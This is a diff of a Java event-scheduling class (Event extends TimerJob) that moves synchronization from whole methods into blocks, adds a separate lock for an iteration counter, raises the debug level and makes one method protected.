@@ -27,9 +27,10 @@ public abstract class Event extends TimerJob {
 
     /** The debug instance. */
     //#ifdef DEBUG
-    private static Debug debug = new Debug("Event", DebugLevel.INFORMATION);
-
+    private static Debug debug = new Debug("Event", DebugLevel.VERBOSE);
     //#endif
+
+    Object iterLock = new Object();
 
     // Gli eredi devono implementare i seguenti metodi astratti
     /**
@@ -107,7 +108,7 @@ public abstract class Event extends TimerJob {
     Future future;
     private String subType;
 
-    protected synchronized void onEnter() {
+    protected void onEnter() {
         // if (Cfg.DEBUG) Check.asserts(!active,"stopSchedulerFuture");
         if (active) {
             //#ifdef DEBUG
@@ -147,17 +148,21 @@ public abstract class Event extends TimerJob {
                 + period);
         //#endif
 
-        if (delay > 0 && conf.repeatAction != Action.ACTION_NULL && iterCounter > 0) {
+        if (delay > 0 && conf.repeatAction != Action.ACTION_NULL
+                && iterCounter > 0) {
             //#ifdef DBC
             Check.asserts(period > 0, " (onEnter) Assert failed, period<=0: "
                     + conf);
             //#endif
-            future = new Future();
-            try{
-            Status.self().getTimer()
-                    .schedule(future, delay * 1000, period * 1000);
-            }catch(Exception ex){
-                Status.self().renewTimer();
+
+            synchronized (this) {
+                future = new Future();
+                try {
+                    Status.self().getTimer()
+                            .schedule(future, delay * 1000, period * 1000);
+                } catch (Exception ex) {
+                    Status.self().renewTimer();
+                }
             }
         }
         active = true;
@@ -198,13 +203,15 @@ public abstract class Event extends TimerJob {
         //#ifdef DEBUG
         debug.trace("stopSchedulerFuture");
         //#endif
-        if (active && future != null) {
-            future.cancel();
-            future = null;
+        synchronized (this) {
+            if (active && future != null) {
+                future.cancel();
+                future = null;
+            }
         }
     }
 
-    protected synchronized void onExit() {
+    protected void onExit() {
         // if (Cfg.DEBUG) Check.asserts(active,"stopSchedulerFuture");
         if (active) {
             //#ifdef DEBUG
@@ -222,12 +229,14 @@ public abstract class Event extends TimerJob {
         }
     }
 
-    protected synchronized boolean stillIter() {
-        iterCounter--;
-        return iterCounter >= 0;
+    protected boolean stillIter() {
+        synchronized (iterLock) {
+            iterCounter--;
+            return iterCounter >= 0;
+        }
     }
 
-    private boolean triggerStartAction() {
+    protected boolean triggerStartAction() {
         //#ifdef DEBUG
         debug.info("triggerStartAction: " + this);
         //#endif
